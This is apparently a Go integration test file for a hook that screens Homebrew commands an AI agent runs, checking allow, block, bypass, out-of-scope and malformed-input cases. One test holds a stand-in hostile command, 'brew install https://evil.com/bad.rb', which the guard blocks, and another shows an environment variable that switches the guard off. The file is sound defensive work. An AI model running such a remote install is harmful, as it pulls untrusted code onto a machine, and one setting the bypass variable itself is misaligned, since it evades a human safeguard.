// main_test.go -- integration tests for the PreToolUse entrypoint.
//
// Exercises run() directly with in-memory stdin/stderr, covering
// allow, block, bypass, out-of-scope, and malformed input paths.

package main

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func tempAuditLog(t *testing.T) (string, func()) {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "audit.jsonl")
	old := os.Getenv("RR_BREW_GUARD_AUDIT_LOG")
	os.Setenv("RR_BREW_GUARD_AUDIT_LOG", path)
	return path, func() {
		if old == "" {
			os.Unsetenv("RR_BREW_GUARD_AUDIT_LOG")
		} else {
			os.Setenv("RR_BREW_GUARD_AUDIT_LOG", old)
		}
	}
}

func makeInput(tool string, payload ToolInputPayload) []byte {
	out, _ := json.Marshal(ToolInput{
		ToolName:  tool,
		ToolInput: payload,
		SessionID: "test-session",
	})
	return out
}

func TestRun_SafeBrewInstall_Allows(t *testing.T) {
	_, cleanup := tempAuditLog(t)
	defer cleanup()

	in := bytes.NewReader(makeInput("Bash", ToolInputPayload{
		Command:     "brew install yarn",
		Description: "install yarn",
	}))
	var stderr bytes.Buffer
	code := run(in, &stderr)
	if code != exitAllow {
		t.Errorf("exit code = %d, want %d. stderr: %s", code, exitAllow, stderr.String())
	}
}

func TestRun_DangerousFlag_Blocks(t *testing.T) {
	_, cleanup := tempAuditLog(t)
	defer cleanup()

	in := bytes.NewReader(makeInput("Bash", ToolInputPayload{
		Command:     "brew install --force yarn",
		Description: "force install",
	}))
	var stderr bytes.Buffer
	code := run(in, &stderr)
	if code != exitBlock {
		t.Errorf("exit code = %d, want %d", code, exitBlock)
	}
	if !strings.Contains(stderr.String(), "blocked") {
		t.Errorf("stderr does not contain 'blocked': %s", stderr.String())
	}
}

func TestRun_NonBashTool_Allows(t *testing.T) {
	_, cleanup := tempAuditLog(t)
	defer cleanup()

	in := bytes.NewReader(makeInput("Write", ToolInputPayload{
		Command: "brew install evil",
	}))
	var stderr bytes.Buffer
	code := run(in, &stderr)
	if code != exitAllow {
		t.Errorf("exit code = %d, want %d (Write tool is out of scope)", code, exitAllow)
	}
}

func TestRun_NonBrewCommand_Allows(t *testing.T) {
	_, cleanup := tempAuditLog(t)
	defer cleanup()

	in := bytes.NewReader(makeInput("Bash", ToolInputPayload{
		Command:     "ls -la /tmp",
		Description: "list files",
	}))
	var stderr bytes.Buffer
	code := run(in, &stderr)
	if code != exitAllow {
		t.Errorf("exit code = %d, want %d (not a brew command)", code, exitAllow)
	}
}

func TestRun_Bypass_Allows(t *testing.T) {
	_, cleanup := tempAuditLog(t)
	defer cleanup()

	os.Setenv("RR_BREW_GUARD_BYPASS", "1")
	defer os.Unsetenv("RR_BREW_GUARD_BYPASS")

	in := bytes.NewReader(makeInput("Bash", ToolInputPayload{
		Command:     "brew install --force yarn",
		Description: "force install with bypass",
	}))
	var stderr bytes.Buffer
	code := run(in, &stderr)
	if code != exitAllow {
		t.Errorf("bypass: exit code = %d, want %d", code, exitAllow)
	}
	if !strings.Contains(stderr.String(), "bypass") {
		t.Errorf("bypass: stderr does not mention bypass: %s", stderr.String())
	}
}

func TestRun_MalformedJson_Blocks(t *testing.T) {
	_, cleanup := tempAuditLog(t)
	defer cleanup()

	in := bytes.NewReader([]byte("{not json"))
	var stderr bytes.Buffer
	code := run(in, &stderr)
	if code != exitBlock {
		t.Errorf("malformed: exit code = %d, want %d (fail closed)", code, exitBlock)
	}
}

func TestRun_URLInstall_Blocks(t *testing.T) {
	_, cleanup := tempAuditLog(t)
	defer cleanup()

	in := bytes.NewReader(makeInput("Bash", ToolInputPayload{
		Command:     "brew install https://evil.com/bad.rb",
		Description: "url install",
	}))
	var stderr bytes.Buffer
	code := run(in, &stderr)
	if code != exitBlock {
		t.Errorf("exit code = %d, want %d", code, exitBlock)
	}
}

func TestRun_AuditLogWritten(t *testing.T) {
	path, cleanup := tempAuditLog(t)
	defer cleanup()

	in := bytes.NewReader(makeInput("Bash", ToolInputPayload{
		Command:     "brew install yarn",
		Description: "install yarn",
	}))
	var stderr bytes.Buffer
	run(in, &stderr)

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("audit log not written: %v", err)
	}
	if !strings.Contains(string(data), `"action":"allow"`) {
		t.Errorf("audit log missing allow event: %s", string(data))
	}
}

func TestRun_MalformedQuoting_Blocks(t *testing.T) {
	_, cleanup := tempAuditLog(t)
	defer cleanup()

	in := bytes.NewReader(makeInput("Bash", ToolInputPayload{
		Command:     "brew install 'unterminated",
		Description: "bad quoting",
	}))
	var stderr bytes.Buffer
	code := run(in, &stderr)
	if code != exitBlock {
		t.Errorf("exit code = %d, want %d (malformed quoting)", code, exitBlock)
	}
}
